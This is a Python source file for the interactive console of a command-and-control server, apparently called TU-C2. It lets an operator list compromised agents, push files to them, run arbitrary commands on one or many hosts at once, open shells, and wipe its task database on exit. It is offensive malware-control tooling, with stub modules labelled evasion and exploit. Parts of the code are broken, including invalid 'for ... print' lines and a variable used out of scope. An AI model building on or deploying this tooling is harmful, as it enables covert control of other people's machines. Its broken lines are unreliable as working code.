# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time
import base64
import pymongo
import json

class Interpreter(threading.Thread):
    def __init__(self, agentList, listeners, loggers):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        self.agentList = agentList
        self.listeners = listeners
        self.loggers = loggers

        self.moduleList = [[[]]]
            # id[, name], type (evasion, exploit, enum, etc.), os, options[]

    def run(self):
        # Record init success
        print("[* Server-Msg] Interpreter thread initialization complete...")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Interpreter initialized and running')            

        # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
        self.printUsage()

        # Input loop
        while True:
            # Prompt
            cmd = str(input("[TU-C2:CONSOLE]$ "))

            # Log command
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Received command: "'+cmd+'"')            
            self.log_history(cmd)

            # Command cases

            # Nothing entered
            if (cmd == "".strip(" ")):
                print("[* Interpreter-Msg] Error: No command received. Try again...")                
                self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Error: No command received')            
                pass
            # Exit - Sleeps all connections and kills Server threads
            elif (cmd.strip(" ") == "exit"):
                self.exit()
            # Prints interpreter command history
            elif (cmd.strip(" ") == "history"):
                self.printHistory()
            # Clear screen
            elif (cmd.strip(" ") == "clear"):
                os.system("clear")
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Screen cleared')
            # Lists all agents that have connected and their status/info
            elif (cmd.strip(" ") == "list-agents"):
                self.listAgents()
            # Usage information
            elif (cmd.strip(" ") == "help"):
                self.printUsage()
            # Upload a file to a remote path through a specified agent connection
            elif (cmd.startswith("upload")):
                upload_agent = ''
                try:
                    local_filename = str(cmd.split()[1])
                    remote_filename = str(cmd.split()[2])
                    arg_id = cmd.split()[3]
                    # print("LF: "+local_filename)
                    # print("RF: "+remote_filename)
                    # print("ID: "+str(arg_id))
                except Exception as ex:
                    print(f"[* Interpreter-Msg:Upload] Unable to process filename or agent-id entered...")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Unable to process filename/agent-id for upload procedure')            
                    print(f"[* Interpreter-Msg:Upload] Error: {ex}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Error: '+str(ex))            
                else:
                    agentFound = False
                    for agent in self.agentList:
                        # print("Loop-AgentID: "+str(agent.getID()))
                        if agent.getID() == arg_id:
                            agentFound = True
                            upload_agent = agent
                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Agent '+str(arg_id)+' exists')
                    
                    # print("AF: "+str(agentFound))
                    if agentFound:
                        # for agent in self.agentList:
                        #     if agent.getID() == bot_id:

                        if upload_agent.upload(local_filename, remote_filename):
                            print(f"[* Interpreter-Msg:Upload] Upload of {local_filename} to agent {arg_id} successful")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Upload of '+str(local_filename)+' to agent '+str(arg_id)+' successful')
                        else:
                            print(f"[* Interpreter-Msg:Upload] Upload of {local_filename} to agent {arg_id} unsuccessful")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Upload of '+str(local_filename)+' to agent '+str(arg_id)+' unsuccessful')
                    else:
                        print(f"[* Interpreter-Msg:Upload] Unable to upload file to agent {arg_id}...")                        
                        print(f"[* Interpreter-Msg:Upload] Agent {arg_id} does not exist...\n")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Unable to upload file with Agent '+str(arg_id))
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Agent '+str(arg_id)+' does not exist')                         
                
            # Kill an active connection - Kill agent process and removes the agent from the servers list
            # TODO: Add a self-destruction function to the agent code
            elif (cmd.startswith("kill")):
                try:
                    arg_id = cmd.split()[1]
                except Exception as ex:
                    print(f"[* Interpreter-Msg:Kill] Unable to process Agent ID entered...")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to process Agent ID for kill')            
                    print(f"[* Interpreter-Msg:Kill] Error: {ex}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Error: '+str(ex))            
                else:
                    # Check if agent exists
                    agentFound = False
                    for agent in self.agentList:
                        if agent.getID() == arg_id:
                            agentFound = True
                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Kill] Agent '+str(arg_id)+' exists')

                    if agentFound:
                        try:
                            self.kill(arg_id)
                        except Exception as ex: 
                            print(f"[* Interpreter-Msg:Kill] Unable to kill connection with agent {arg_id}...")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to kill connection for agent '+arg_id)            
                            print(f"[* Interpreter-Msg:Kill] Error: {ex}")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Error: '+str(ex))            
                    else:
                        print(f"[* Interpreter-Msg:Kill] Unable to kill connection with agent {arg_id}...")                        
                        print(f"[* Interpreter-Msg:Kill] Agent {arg_id} does not exist...\n")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Unable to kill connection with Agent '+str(arg_id))
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Kill] Agent '+str(arg_id)+' does not exist') 

            # Initiate interaction selection - Batch, single, or shell modes supported
            elif (cmd.startswith("interact")):
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Interaction] Initiating mode selection prompt')
                
                interaction_mode_success = False
                while not interaction_mode_success:
                    print(f"[* Interpreter-Msg:Interaction] Batch or single agent mode?\n")
                    print(f"\t\t[0] Batch")
                    print(f"\t\t[1] Single")

                    try:
                        mode_num = int(input("\n[* InteractionMode-Select] "))
                    except Exception as ex:
                        print(f"[* Interpreter-Msg:Interaction] Unable to process selection")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Interaction] Unable to process selection')            
                        print(f"[* Interpreter-Msg:Interaction] Error: {ex}")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Interaction] Error: '+str(ex))
                    else:
                        if mode_num == 0:
                            self.batchMode()
                            interaction_mode_success = True
                        elif mode_num == 1:
                            self.singleMode()
                            interaction_mode_success = True
                        else:
                            print(f"[* Interpreter-Msg:Interaction] Unable to process selection")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Interaction] Unable to process selection')          

            elif (cmd.startswith("shell")):
                try:
                    arg_id = str(cmd.split()[1])
                except Exception as ex:
                    print(f"[* Interpreter-Msg:Shell] Unable to process agent ID entered...")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Unable to process agent ID entry')            
                    print(f"[* Interpreter-Msg:Shell] Error: {ex}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Error: '+str(ex))            
                else:
                    # Check if exists
                    agentFound = False
                    # shell_agent = ''
                    # shell_success = ''
                    for agent in self.agentList:
                        if agent.getID() == arg_id:
                            agentFound = True
                            # shell_agent = agent
                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Shell] Agent '+str(arg_id)+' exists')

                    if agentFound:
                        try:
                            agent.stopBeacon()
                            # shell_success = self.shell(arg_id)
                            agent.startBeacon()
                        except Exception as ex: 
                            print(f"[* Interpreter-Msg:Shell] Unable to initiate interaction with agent {arg_id}...")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Unable to initiate interaction with agent '+str(arg_id))            
                            print(f"[* Interpreter-Msg:Shell] Error: {ex}")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Error: '+str(ex))
                    else:
                        print(f"[* Interpreter-Msg:Shell] Unable to initiate interaction with agent {arg_id}...")                        
                        print(f"[* Interpreter-Msg:Shell] Agent {arg_id} does not exist...\n")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Unable to initiate interaction with Agent '+str(arg_id))
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Shell] Agent '+str(arg_id)+' does not exist')

            else:
                print("[* Interpreter-Msg] Unable to process command. Try again...")
                self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Unable to process command. Retrying...')

#------------------------------------------------------------------------------------------------------------------------------
    def printUsage(self):
        print('''
[* Interpreter-Msg] Usage information:\n
[+ COMMANDS +]
        SERVER:
        - help                          : Print this message
        - exit                          : Exits the program; Causes agents to sleep and retry every 10-45 seconds
        - clear                         : Clears the screen; Presents a fresh terminal
        - list-agents                   : Lists all active agents in use
        AGENTS:
        - interact                      : Opens an interactive BASH/CMD prompt on the selected agent
        - kill <id>                     : Kill a connection to a specific agent. Causes agent process to exit. [* Will not recur *]
        MODULES:
        - list-modules <windows|linux>  : List all modules currently available to the user on the C2, seperated by operating system
        - load-module <module-name>     : Loads a module into the chamber       

        ''')
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Help message printed')

#------------------------------------------------------------------------------------------------------------------------------
    def batchMode(self):
 
        batchList = []

        os.system("clear")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering batch-mode, prompting for agent-list')

        print('''
[* Interpreter-Msg:BatchMode] Entering Batch-Mode execution...\n
[* Interpreter-Msg:BatchMode] Systems in use under this mode will all receive the same command that you enter
[* Interpreter-Msg:BatchMode] Enter QUIT into the terminal to exit batch-mode \n\n

        ''')
        self.listAgents()


        bm_success = False
        bm_entry = ''

        # This loop is not good fix it << but it works
        while (not bm_success):
            if('quit'.casefold().strip(" ") in bm_entry):
                break
            else:    
                try:
                    bm_entry = input('[* Interpreter-Msg:BatchMode] Enter list of agent-IDs to interact with (seperated by spaces): ')
                    idlist = [str(n) for n in bm_entry.split()]
                    print(f"[* Interpreter-Msg:BatchMode] ID list obtained: {str(idlist)}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg:BatchMode] Batch-mode ID list obtained: '+str(idlist))            

                except Exception as ex:
                    print(f"[* Interpreter-Msg:BatchMode] Unable to form list of IDs to add to BatchMode-list")
                    self.loggers[0].q_log('serv','error',('[* Interpreter-Msg:BatchMode] Unable to form list of IDs to add to BatchMode-list: ' + str(bm_entry)))
                    print(f"[* Interpreter-Msg:BatchMode] Error: {ex}")
                    self.loggers[0].q_log('serv','error',('[* Interpreter-Msg:BatchMode] Error: ' + str(ex)))
                    bm_success = False
                else:
                    for conn in self.agentList:
                        if conn.getID() in idlist:
                            batchList.append(conn)

                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Stopping beacons for agents '+str(idlist)+' while in batch-mode')            
                            conn.stopBeacon()
                    bm_success = True

        time.sleep(0.3)

        if(bm_success):
            os.system("clear")
            print(f'''
[* Interpreter-Msg:BatchMode] Batch-Mode execution confirmed: 
[* Interpreter-Msg:BatchMode] The commands entered here will be sent to these agents: {idlist}
[* Interpreter-Msg:BatchMode] Note that this mode will not allow for individual shell environment interaction\n
[* Interpreter-Msg:BatchMode] Enter Q or QUIT at any time to exit this mode
[* Interpreter-Msg:BatchMode] Enter EXIT at any time to exit the C2\n\n
            ''')

            batch_cmd = ""
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Initiating Batch-Mode prompt')

            while (True):
                batch_cmd = str(input("[CM:BATCH-CMD]% "))
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Batch-Mode command received: '+batch_cmd)

                if(batch_cmd.casefold().strip(" ") == "quit" or batch_cmd.casefold().strip(" ") == "q" or batch_cmd.casefold().strip(" ") == "exit"):

                    # Reset beacon variable to continue
                    for conn in batchList:
                        conn.startBeacon()
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Restarting beacons')
                    batchList.clear()
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Cleaning Batch list')
                    break
                elif (batch_cmd.casefold().strip(" ") == "shell"):
                    print("[* Interpreter-Msg:BatchMode] Can't interact with individual shells in this environment")
                    print("[* Interpreter-Msg:BatchMode] Please exit if that is the desired result\n")
                    self.loggers[0].q_log('serv','warning','[* Interpreter-Msg:BatchMode] Attempted shell execution in batch-mode')
                    continue
                elif (batch_cmd.casefold().strip(" ") == "clear"):
                    os.system("clear")
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Screen cleared')

                elif (batch_cmd.startswith("upload")):
                    try:
                        local_filename = str(batch_cmd.split()[1])
                        remote_filename = str(batch_cmd.split()[2])
                    except Exception as ex:
                        print(f"[* Interpreter-Msg:SingleMode] Unable to process filename entered...")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:SingleMode] Unable to process filename for upload procedure')            
                        print(f"[* Interpreter-Msg:SingleMode] Error: {ex}")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:SingleMode] Error: '+str(ex))            
                    else:
                        for agent in batchList:
                            if agent.upload(local_filename, remote_filename):
                                print(f"[* Interpreter-Msg:Upload] Upload of {local_filename} to agent {agent.getID()}successful")
                                self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Upload of '+str(local_filename)+' to agent '+str(agent.getID())+' successful')
                            else:
                                print(f"[* Interpreter-Msg:Upload] Upload of {local_filename} to agent {agent.getID()} unsuccessful")
                                self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Upload of '+str(local_filename)+' to agent '+str(agent.getID())+' unsuccessful')

                else:
                    try:
                        print(f"[+] Sending Command: {batch_cmd} to {str(len(batchList))} agents")
                        for conn in batchList:                                     
                            time.sleep(0.1)
                            print(f"[* BATCH-CMD] Agent #{conn.getID()} response: ")
                            print(conn.execute(batch_cmd))
                    except Exception as ex:
                        print("[* Interpreter-Msg:BatchMode] Error with sending command or receiving output")
                        self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Error with sending command or receiving output')
                        print(f"[* Interpreter-Msg:BatchMode] Error: {ex}")
                        self.loggers[0].q_log('serv','warning',('[* Interpreter-Msg:BatchMode] Error: ' + str(ex)))

        # RESET BEACON
        print(f"[* Interpreter-Msg:BatchMode] Exiting Batch-Mode... Returning to main-menu...")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:BatchMode] Exiting Batch-Mode... Returning to main-menu...')

#------------------------------------------------------------------------------------------------------------------------------

    def singleMode(self):
 
        # batchList = []

        os.system("clear")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:SingleMode] Entering single-mode, prompting for agent selection')

        print('''
[* Interpreter-Msg:SingleMode] Entering Single-Mode execution...\n
[* Interpreter-Msg:SingleMode] The system you select here will receive commands that are NOT cmd.exe/bash applicable and can only process the below commands:

                    - upload <localfile> <remotefile>   :   Uploads base64 encoded <LocalFile> to the <RemoteFile> path location on the target through the agent
                    - pwd                               :   Prints the current working directory the agent is executing from
                    - ping                              :   PONG.
                    - getpid                            :   Returns the Agent's process ID
                    - whoami                            :   Returns the user that the agent is running as
                    - hostname                          :   Returns the hostname of the system that the agent is executing on
                    - quit/exit                         :   Exits Single-mode interaction and returns to the main menu (Does not kill the agent connection)
                    - clear                             :   Clears the screen

[* Interpreter-Msg:SingleMode] Enter QUIT into the terminal at any time to exit single-mode \n\n
        ''')

        self.listAgents()

        sm_success = False
        sm_entry = ''
        single_agent = ''
        # This loop is not good fix it << but it works
        while (not sm_success):
            if('quit'.casefold().strip(" ") in sm_entry):
                break
            else:    
                try:
                    sm_entry = input('[* Interpreter-Msg:SingleMode] Please enter the ID of the agent you would like to interact with: ')
                    # print(f"[* Interpreter-Msg] ID list obtained: {str(idlist)}")
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg:SingleMode] Agent ID obtained: '+sm_entry)

                except Exception as ex:
                    print(f"[* Interpreter-Msg:SingleMode] Unable to process ID entered. Please try again.")
                    self.loggers[0].q_log('serv','error',('[* Interpreter-Msg:SingleMode] Unable to process ID entered'))
                    print(f"[* Interpreter-Msg:SingleMode] Error: {ex}")
                    self.loggers[0].q_log('serv','error',('[* Interpreter-Msg:SingleMode] Error: ' + str(ex)))
                    sm_success = False
                else:
                    for conn in self.agentList:
                        if conn.getID() == sm_entry:
                            single_agent = conn
                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:SingleMode] Stopping beacon for agent '+str(conn.getID())+' while in single-mode')            
                            conn.stopBeacon()
                            sm_success = True

                    if not sm_success:
                        print(f"[* Interpreter-Msg:SingleMode] Agent with ID {str(sm_entry)} not found. Please try again.")
                        self.loggers[0].q_log('serv','error',('[* Interpreter-Msg:SingleMode] Agent with ID '+str(sm_entry)+' not found'))

        time.sleep(0.3)

        if(sm_success):
            os.system("clear")
            print(f'''
[* Interpreter-Msg:SingleMode] Single-Mode target confirmed: 
[* Interpreter-Msg:SingleMode] The commands entered here will be sent to agent {single_agent.getID()}
[* Interpreter-Msg:SingleMode] Note that this mode will not allow for individual shell environment interaction\n
[* Interpreter-Msg:SingleMode] The system you select here will receive commands that are NOT cmd.exe/bash applicable and can only process the below commands:

                    - upload <localfile> <remotefile>   :   Uploads base64 encoded <LocalFile> to the <RemoteFile> path location on the target through the agent
                    - pwd                               :   Prints the current working directory the agent is executing from
                    - ping                              :   PONG.
                    - getpid                            :   Returns the Agent's process ID
                    - whoami                            :   Returns the user that the agent is running as
                    - hostname                          :   Returns the hostname of the system that the agent is executing on
                    - quit/exit                         :   Exits Single-mode interaction and returns to the main menu (Does not kill the agent connection)
                    - clear                             :   Clears the screen

[* Interpreter-Msg:SingleMode] Enter Q or QUIT at any time to exit this mode
[* Interpreter-Msg:SingleMode] Enter EXIT at any time to exit the C2\n\n
            ''')

            single_cmd = ""
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:SingleMode] Initiating Single-Mode prompt')

            while (True):
                single_cmd = str(input("[CM:SINGLE-CMD]% "))
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Single-Mode command received: '+single_cmd)

                if(single_cmd.casefold().strip(" ") == "quit" or single_cmd.casefold().strip(" ") == "q" or single_cmd.casefold().strip(" ") == "exit"):

                    # Reset beacon variable to continue
                    single_agent.startBeacon()
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Restarting beacon')
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Cleaning Batch list')
                    break
                elif (single_cmd.casefold().strip(" ") == ""):
                    print('''
[* Interpreter-Msg] No command entered. Enter (exit, quit, or q) to exit or one of the following commands:
                    - upload <localfile> <remotefile>   :   Uploads base64 encoded <LocalFile> to the <RemoteFile> path location on the target through the agent
                    - pwd                               :   Prints the current working directory the agent is executing from
                    - ping                              :   PONG.
                    - getpid                            :   Returns the Agent's process ID
                    - whoami                            :   Returns the user that the agent is running as
                    - hostname                          :   Returns the hostname of the system that the agent is executing on
                    - quit/exit                         :   Exits Single-mode interaction and returns to the main menu (Does not kill the agent connection)
                    - clear                             :   Clears the screen
            ''')
                elif (single_cmd.casefold().strip(" ") == "shell"):
                    print("[* Interpreter-Msg] Can't spawn shells in this environment")
                    print("[* Interpreter-Msg] Please exit if that is the desired result\n")
                    self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Attempted shell execution in single-mode')
                    continue
                elif (single_cmd.casefold().strip(" ") == "clear"):
                    os.system("clear")
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Screen cleared')
#------------------------------------------------------------------------------------------------------------------------------
                # What in the flying fuck are you doing here in interpreter! Move this shit to Handler
                elif (conn.getTT() == "HTTP" and single_cmd.casefold().strip(" ") == "ping"):
                    ret_val = json.loads(conn.execute(f'[{{"task_type":"ping","agent_id":"{str(conn.getID())}"}}]'))
                    res_task_id = [key for key in ret_val.keys() if key != "agent_id" and key != "_id" and key != "result_id"]
                    for id in res_task_id print(ret_val[res_task_id[0]]['contents'])
#------------------------------------------------------------------------------------------------------------------------------
                elif (single_cmd.startswith("upload")):
                    try:
                        local_filename = str(single_cmd.split()[1])
                        remote_filename = str(single_cmd.split()[2])
                    except Exception as ex:
                        print(f"[* Interpreter-Msg:SingleMode] Unable to process filename entered...")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:SingleMode] Unable to process filename for upload procedure')            
                        print(f"[* Interpreter-Msg:SingleMode] Error: {ex}")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg:SingleMode] Error: '+str(ex))            
                    else:
                        if single_agent.upload(local_filename, remote_filename):
                            print(f"[* Interpreter-Msg:Upload] Upload of {local_filename} to agent successful")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Upload of '+str(local_filename)+' to agent '+str(single_agent.getID())+' successful')
                        else:
                            print(f"[* Interpreter-Msg:Upload] Upload of {local_filename} to agent {single_agent.getID()} unsuccessful")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg:Upload] Upload of '+str(local_filename)+' to agent '+str(single_agent.getID())+' unsuccessful')
                else:
                    try:
                        print(f"[+] Sending Command: {single_cmd} to agent {str(single_agent.getID())}")
                        time.sleep(0.1)
                        print(f"[* SINGLE-CMD] Agent {str(single_agent.getID())} response: ")
                        if conn.getTT() == "TCP" or conn.getTT() == "DNS":
                            print(conn.execute(single_cmd))
                        elif conn.getTT() == "HTTP":
                            ret_val = json.loads(conn.execute(f'[{{"task_type":"execute","agent_id":"{str(conn.getID())}","command":"{single_cmd}"}}]'))
                            res_task_id = [key for key in ret_val.keys() if key != "agent_id" and key != "_id" and key != "result_id"]
                            for id in res_task_id print(ret_val[res_task_id[0]]['contents'])
                    except Exception as ex:
                        print("[* Interpreter-Msg] Error with sending command or receiving output")
                        self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Error with sending command or receiving output')
                        print(f"[* Interpreter-Msg] Error: {ex}")
                        self.loggers[0].q_log('serv','warning',('[* Interpreter-Msg] Error: ' + str(ex)))

        print(f"[* Interpreter-Msg] Exiting Single-Mode... Returning to main-menu...")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Exiting Single-Mode... Returning to main-menu...')
#------------------------------------------------------------------------------------------------------------------------------
    def exit(self):
        print(f"[* Interpreter-Msg:Exit] Closing connection to {str(len(self.agentList))} agents")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Exit] Closing connection to all agents')

        for agent in self.agentList:                                         
            time.sleep(0.1)

            if agent.getTT() == "TCP":
                if agent.execute("exit") == agent.getReply("exit"):
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Exit] Successfully exited connection for agent '+str(agent.getID()))
            elif agent.getTT() == "HTTP":
                agent.execute(f'[{{"task_type":"configure","running":"false","dwell":"1.0","agent_id":"{str(agent.getID())}"}}]')
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Exit] "exit" command sent to all active agents')

        print("[* Interpreter-Msg:Exit] Exiting connections for all agents. Please wait...")
        time.sleep(3)

        if agent.getTT() == "HTTP":
            print("[* Interpreter-Msg:Exit] Cleaning up database...")
            pymongo.MongoClient("mongodb://localhost:27017/")["skytree"]["result"].remove({})
            pymongo.MongoClient("mongodb://localhost:27017/")["skytree"]["task"].remove({})

        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Exit] Exiting C2')       
        os._exit(0)
#------------------------------------------------------------------------------------------------------------------------------
    def listAgents(self): # Change to listAlive(self)
        print(".----------------------------------------------------------------------------------------------.")
        print("|                                      LIST OF AGENTS                                          |")
        print(".--------------------------------------v------------------v--------v-----------v------v--------.")
        print("|                   ID                 |  IP ADDRESS (v4) |  PORT  |    OS     | PING | BEACON |")
        print(":--------------------------------------:------------------:--------:-----------:------:--------:")

        for agent in self.agentList:
            print("| %30s | %16s | %6d | %9s | %4s | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.getOS(), agent.status[0], agent.status[1]))
            print(":--------------------------------------:------------------:--------:-----------:------:--------:")
#------------------------------------------------------------------------------------------------------------------------------
    def shell(self, id):
        # print("Shell function entry point")
        print(f"[* Interpreter-Msg:Shell] Entering individual interaction with agent #{id}.\n")
        print("[* Interpreter-Msg:Shell] Be mindful that this mode is quite loud.")
        print("[* Interpreter-Msg:Shell] An interactive shell process has been spawned...\n\n")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Shell] Entering individual interaction mode for agent '+str(id))

        shellExecStatus = False
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Shell] Calling handler .shell() function')

        for agent in self.agentList:
            if agent.getID() == id:
                shellExecStatus = agent.shell()

        if shellExecStatus:
            print("[* Interpreter-Msg:Shell] Shell exited gracefully...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Shell] Individual shell interaction mode for agent '+str(id)+' exited successfully')
        else:
            print("[* Interpreter-Msg:Shell] Shell exited with errors...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Shell] Individual shell interaction mode for agent '+str(id)+' exited unsuccessfully')
#------------------------------------------------------------------------------------------------------------------------------
    def kill(self, id):
        print(f"[* Interpreter-Msg:Kill] Killing connection with agent {id}.\n")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Kill] Killing connection with agent '+str(id))
        # self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Kill] Calling handler .kill() function')

        for agent in self.agentList:
            if agent.getID() == id:
                killStatus = agent.kill()

        if killStatus:
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Kill] Removing agent '+str(id)+' from agent list')
            for agent in self.agentList:
                if agent.getID() == id:
                    self.agentList.remove(agent)
                    break
            print(f"[* Interpreter-Msg:Kill] Agent {id} was killed peacefully...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Kill] agent '+str(id)+' was killed successfully')

        else:
            print(f"[* Interpreter-Msg:Kill] Agent {id} was killed with errors...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Kill] agent '+str(id)+' was killed unsuccessfully')
#------------------------------------------------------------------------------------------------------------------------------
    def log_history(self, cmd):
        with open("log/.history", "a") as history:
            history.write(cmd+'\n')
#------------------------------------------------------------------------------------------------------------------------------ 
    def printHistory(self):
        with open("log/.history", 'r') as f:
            print(f.read())
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] History printed')
#------------------------------------------------------------------------------------------------------------------------------
#------------------------------------------------------------------------------------------------------------------------------
# MOD STUFFS
#------------------------------------------------------------------------------------------------------------------------------
#------------------------------------------------------------------------------------------------------------------------------
    def listModules(self):
        print("TODO")
#------------------------------------------------------------------------------------------------------------------------------
    def viewModule(self, module):
        print("straight")
        # print options, example values, desc, etc.
#------------------------------------------------------------------------------------------------------------------------------
    def loadModule(self, module, options):
        print("TODO")
#------------------------------------------------------------------------------------------------------------------------------

